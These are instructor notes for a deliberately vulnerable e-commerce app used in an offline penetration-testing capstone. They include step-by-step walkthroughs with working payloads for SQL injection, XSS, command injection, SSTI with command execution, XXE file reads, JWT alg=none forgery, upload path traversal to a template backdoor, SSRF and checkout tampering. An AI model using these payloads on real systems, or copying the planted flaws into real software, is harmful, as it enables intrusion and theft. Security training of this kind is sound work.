# 🔒 INSTRUCTOR NOTES — NetPoint Store (Capstone Target)

> **AUTHORIZED LAB ONLY.** This application is intentionally vulnerable by design for a one-day
> offline penetration-testing workshop. Never deploy it on a public network or internet-facing host.
> Every intentional flaw is tagged in source with `// VULN:` comments.

**App URL after `docker compose up --build`:** http://localhost:9000
**Containers:** `netpoint-app` (Node), `netpoint-db` (MySQL 8, internal + volume), `netpoint-inventory-sync` (internal-only SSRF target)

**Seeded accounts**

| id | username   | email                   | password   | role     |
|----|------------|-------------------------|------------|----------|
| 1  | admin      | admin@netpoint.store    | `admin123` | **admin**|
| 2  | sarah.j    | sarah.j@example.com     | `Passw0rd` | customer |
| 3  | mike_t     | mike_t@example.com      | `qwerty12` | customer |
| 4  | emma.w     | emma.w@example.com      | `dragon99` | customer |
| 5  | dkim       | dkim@example.com        | `letmein1` | customer |
| 6  | priya.s    | priya.s@example.com     | `hunter2x` | customer |

Passwords are stored as **unsalted MD5** (`src/routes/auth.js` helper `md5()`). The old dump at
`/.env`, `/config.js.old` and `/db_dump_old.sql.bak` (see §14–16) contains the hashes so students
can crack them offline with hashcat/john.

Sample orders: #1001, #1002 (sarah.j), #1003 (mike_t) — useful IDOR targets.

---

## Vulnerability index

| # | Category | Where | Key file / route |
|---|----------|-------|------------------|
| 1 | SQLi — classic auth bypass | Login | `src/routes/auth.js` → POST `/login` |
| 2 | SQLi — UNION/error-based | Catalog search | `src/routes/products.js` → GET `/products`, `/product/:id` |
| 3 | SQLi — blind second-order | Profile stats | `src/routes/profile.js` → GET `/profile` |
| 4 | Stored XSS | Product reviews | `src/views/product.ejs` (`<%- r.body %>`) |
| 5 | Reflected XSS | Search results | `src/views/products.ejs` (`<%- q %>`) |
| 6 | Command injection | Receipt download | `src/routes/orders.js` → GET `/orders/:id/receipt` |
| 7 | SSTI | Invoice gift note | `src/routes/orders.js` → GET `/orders/:id` |
| 8 | XXE | Admin XML import | `src/util/xmlparse.js`, POST `/admin/import` |
| 9 | IDOR — orders/invoices/receipts | Order pages | `src/routes/orders.js` |
| 10 | Broken access control — admin panel | All `/admin/*` | `src/middleware/auth.js` `requireAdmin` |
| 11 | Mass assignment / IDOR profile edit | Profile update | `src/routes/profile.js` → POST `/profile/update` |
| 12 | Weak password policy | Register/reset/change | `auth.js`, `profile.js` |
| 13 | Username enumeration | Login + forgot | `auth.js` |
| 14 | No rate limiting / lockout | Login | global (absence) |
| 15 | JWT: alg=none accepted, weak secret, no exp | Session cookie | `src/util/jwtx.js` |
| 16 | Predictable reset token, never expires | Forgot/reset | `auth.js` |
| 17 | Verbose errors / stack traces | Global error handler | `src/app.js` |
| 18 | Missing security headers | All responses | `app.js` (absence) |
| 19 | Permissive CORS w/ credentials | All responses | `app.js` middleware |
| 20 | Exposed `.env` | Static route | `src/public/.env` via `express.static({dotfiles:'allow'})` |
| 21 | Exposed `.git` directory | Web root | shipped as `src/public/vcs-metadata/`, materialized to `.git` by Dockerfile |
| 22 | Backup files in web root | Static | `/config.js.old`, `/db_dump_old.sql.bak` |
| 23 | Directory listing on `/uploads/` | Uploads index | `app.js` custom index handler |
| 24 | Debug endpoints leaking secrets | Diagnostics | `/debug/status`, `/debug/logs` in `misc.js` |
| 25 | Default weak admin creds | Seed | `admin/admin123` |
| 26 | SSRF | Avatar-from-URL, product image sync | `profile.js`, `admin.js` → internal service `inventory-sync:4000` |
| 27 | Price manipulation at checkout | Checkout API | `src/routes/cart.js` → POST `/checkout` |
| 28 | Coupon reuse + stacking | Coupons/checkout | `cart.js`, seed coupons |
| 29 | Negative quantity → negative total → store credit | Checkout | `cart.js` |
| 30 | Race condition — points redemption | Loyalty endpoint | `cart.js` → POST `/account/redeem` |
| 31 | Unrestricted upload + path traversal write | Avatar & review images | `middleware/upload.js` (originalname reused; deny-list only) |
| 32 | Open redirect | Post-login redirect | `auth.js` → `?next=` |
| 33 | Vulnerable pinned dependencies | npm audit | see §20 |

---

## Detailed walkthroughs

### 1. Classic SQLi — login bypass (easy)
POST `/login` builds `SELECT * FROM users WHERE email = '<email>' AND password_hash = MD5('<pw>')`.
- Email: `' OR 1=1-- -` with any password → logs in as **user id 1 (admin)**.
- Verbose DB errors also leak the query when the payload breaks syntax.

### 2. SQLi — search (UNION)
GET `/products?search=...` and `/product/:id` concatenate input into LIKE / equality.
- Recon: `'` → stack trace shows full SQL (verbose errors).
- Columns in products SELECT: `id,name,description,price,stock,image_url,category_id,featured,created_at,category_name` (11).
  Example exfil of admin hash:
  `%' UNION SELECT 1,email,password_hash,'a','a','a',1,1,NOW(),'x' FROM users WHERE role='admin'-- -`
- Time-based works too: `%' AND SLEEP(5)-- -`.

### 3. Second-order SQLi — registration → profile stats (hard)
Registration stores any printable username ≤24 chars (INSERT is parameterized).
`GET /profile` then concatenates the *stored* username:
`... WHERE u.username = '<username>'`.
- Register username: `' OR SLEEP(5)-- -` → every `/profile` visit sleeps 5s (time-based blind).
- Boolean extraction via displayed order count: `' OR (SELECT SUBSTRING(password_hash,1,1) FROM users WHERE role='admin')='0` etc.
Note: such an account cannot log in through the (also injectable) login form — that's fine, the session is issued right after registration.

### 4. Stored XSS — reviews
Review bodies are rendered raw (`<%- r.body %>` in product.ejs). Cookie is not HttpOnly.
Payload: `<script>fetch('http://localhost:9000/debug/logs')</script>` or classic `<img src=x onerror=alert(document.cookie)>`. Session theft → admin replay is a valid chain.

### 5. Reflected XSS — search
`GET /products?search=<img src=x onerror=alert(1)>` reflects unescaped in the “Results for …” line.

### 6. Command injection — receipt generator (medium)
Checkout accepts a gift note; `GET /orders/:id/receipt` runs:
`exec("node scripts/make_receipt.js --order <id> --message \"<gift>\" ...")`
Gift note value: `"; touch /tmp/pwned #` (or `` `id > /tmp/id` ``). Verify inside container:
`docker compose exec app ls -la /tmp`. Executes as unprivileged `node` user (impact scoped).

### 7. SSTI — invoice gift note
Order page renders the note with `ejs.render(note)` directly.
- Detect: `<%= 7*7 %>` → 49 on the invoice.
- RCE: `<%= global.process.mainModule.require('child_process').execSync('id').toString() %>` (set it as the gift message at checkout).

### 8. XXE — catalog import (any logged-in user can reach /admin/import!)
The legacy parser resolves DTD entities including `SYSTEM "file://..."`.
```
<?xml version="1.0"?>
<!DOCTYPE catalog [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<catalog><product><name>&xxe;</name><price>1</price></product></catalog>
```
Import succeeds; the imported product name (visible in the result list / catalog) now contains `/etc/passwd`. Also try `file:///app/src/public/.env`. Parse errors echo resolved content too.

### 9–11. Access control
- **IDOR:** log in as any user, open `/orders/1001`, `/orders/1003`, `/orders/1003/receipt` — no ownership check anywhere on order reads.
- **Admin panel:** nav link hidden for non-admins only. Any account browsing to `/admin`, `/admin/users`, `/admin/import` gets full access. From there you can promote yourself (`role=admin`) or delete users.
- **Mass assignment:** POST `/profile/update` takes `id` from the body and writes every submitted column. Change another user's data by editing `id`; include `"role":"admin"`, `"balance":9999` for self-service privesc (JSON body).

### 12–16. Auth flaws
- Passwords capped at **8 chars**, no complexity (register/reset/change forms).
- Login/forgot return **distinct errors** (“No NetPoint account found…” vs “Incorrect password.”) → enumeration; timing differs too.
- No rate limiting anywhere → hydra/ffuf brute force of `admin@netpoint.store`.
- **JWT session cookie** (`session`): HS256 with secret `netpoint_super_secret_2024` (in `.env`, `config.js.old`, git history — crackable offline with rockyou-style wordlists). Verifier **accepts `alg:none`**: forge `{"alg":"none","typ":"JWT"}` + payload `{"uid":1,"role":"admin","username":"admin"}`, no signature → instant admin. No expiry enforcement either (tokens valid forever).
- **Reset tokens are deterministic:** `md5("<id>:<email>")`, never expire, single-use not enforced. Compute emma's link yourself: md5("4:emma.w@example.com") → `/reset?token=<md5>`.

### 17–20, 24–25. Misconfig
- Stack traces returned whenever DEBUG_ERRORS=true (compose default).
- No CSP/XFO/HSTS/nosniff/referrer-policy anywhere; clickjacking demos work.
- CORS reflects arbitrary Origin **with credentials** → cross-origin authenticated reads.
- `GET /.env` → DB creds, JWT secret. `robots.txt` even names it.
- `/debug/status` dumps all env vars + DB stats unauthenticated.
- `/debug/logs` tails the mock mailer → **password-reset links appear here** after someone requests a reset (chain: trigger reset for victim → read token → take over account).
- Admin seeds as `admin123`.

### 21. `.git` exposure
A real repository lives in the app's web root at `/.git/` (two commits). In the source tree it ships as
`src/public/vcs-metadata/` and the Dockerfile copies it to `src/public/.git` during build (git itself
refuses to track a nested `.git/` path — that's why the rename dance exists).
Fetchable once running: `/.git/HEAD`, `/.git/config`, objects under `/.git/objects/...`. Use
[git-dumper](https://github.com/arthaud/git-dumper) (`git-dumper http://localhost:9000/.git dumped`) or
manual zlib inflation; the second commit deletes `server/config/default.js` but its blob still holds
`rootpw`, the JWT secret, and a fake Stripe test key.

### 23. Uploads directory listing
`GET /uploads/` renders a hand-rolled Apache-style index listing every uploaded file (including other users' avatars and review attachments).

### 26. SSRF
Two features fetch attacker URLs server-side with axios (no validation):
- Customer: profile page “load avatar from URL” (`POST /profile/avatar-url`).
- Admin panel: product photo sync (`POST /admin/products/sync-image`).
Both display a text preview of non-image responses → direct exfil.
Targets on the compose network (hostnames resolvable only inside):
- `http://inventory-sync:4000/metrics` → fake AWS keys
- `http://inventory-sync:4000/debug/env` → `INTERNAL_API_TOKEN`, ERP endpoint, DSN
- `http://db:3306` (port-scan behavior), `file://` is covered by XXE instead.

### 27–30. Business logic
- **Price tampering:** checkout trusts client JSON. Intercept `POST /checkout`, set `"price":0.01` per item, or negative qty: `{"product_id":1,"qty":-5,"price":79.99}` → total goes negative → **store credit added to balance** (visible on profile). Buy real items afterwards using credit.
- **Coupon abuse:** `WELCOME10`/`STACK20` have no usage cap; `coupons` field is comma-separated and codes **stack additively** — `WELCOME10,STACK20` = −30%. Same code may repeat in the list.
- **Race condition:** `POST /account/redeem` reads points, checks, then updates — no transaction/lock. Fire ~10 parallel redeems of the full point balance → each succeeds → balance multiplied.

### 31. File upload
Deny-list blocks only `.php/.exe/...`; content-type ignored; the **original multipart filename is preserved verbatim** (`legacyUploadSingle` in `middleware/upload.js`, built on busboy with `preservePath: true` — multer is NOT used for customer media).
- Stored XSS: upload `avatar.html` or `poc.svg` (script tag), served from `/uploads/poc.html`.
- Path traversal → RCE: set the multipart filename to `../../views/product.ejs` (Burp Repeater on the avatar/review upload) containing an EJS backdoor like `<%= global.process.mainModule.require('child_process').execSync('id').toString() %>` — every subsequent render of that template executes it as the unprivileged `node` container user (`uid=1000`). Overwriting `404.ejs` is the least disruptive demo target.
- Restore a wrecked template without wiping data: `docker compose up -d --build app` re-copies source files over the container filesystem (uploads vanish too — DB survives).

### 32. Open redirect
Login form carries hidden `next`; `POST /login` redirects to it unvalidated. `?next=https://evil.example` (also `//evil.example`). Registration auto-login doesn't honor it — use login flow.

---

## 20. Deliberately outdated dependencies

Run `npm audit` (or Snyk/Trivy) against the image:

| Package | Pinned | Known issue |
|---------|--------|-------------|
| lodash | 4.17.15 | CVE-2020-8203 prototype pollution (<4.17.19) |
| axios | 0.19.2 | CVE-2020-28168 SSRF bypass, CVE-2021-3749 ReDoS (<0.21.4) |
| ejs | 3.1.6 | CVE-2022-29078 settings[prompt] RCE (<3.1.7) |
| multer | 1.4.2 | CVE-2022-24434 DoS; npm deprecates the whole 1.x line (used for the XML import endpoint) |

`npm audit` reports multiple high/critical findings out of the box — a dependency-scan exercise scores full marks with zero exploitation.

## Grading suggestion (100 pts)

| Area | Points |
|------|--------|
| Recon (.env, .git, backups, robots, dir listing) | 15 |
| Injection (SQLi ×3, XSS ×2, cmd inj, SSTI, XXE) | 35 |
| Auth/session (JWT forge OR secret crack, reset predict, enumeration) | 20 |
| Access control (IDOR orders, admin bypass, mass assignment privesc) | 15 |
| Business logic (price tamper OR coupon stack OR race) | 10 |
| Bonus chains (SSRF→internal service, upload traversal→RCE, reset-link via debug logs) | 5 |

## Lab ops

```bash
docker compose up --build          # start fresh
docker compose logs -f app         # watch exploitation live
docker compose exec db mysql -uroot -prootpw netpoint -e "SELECT * FROM users;"  # verify SQLi findings
docker compose down -v             # full reset between classes
```

No external network needed at runtime; only image pulls/npm during build.
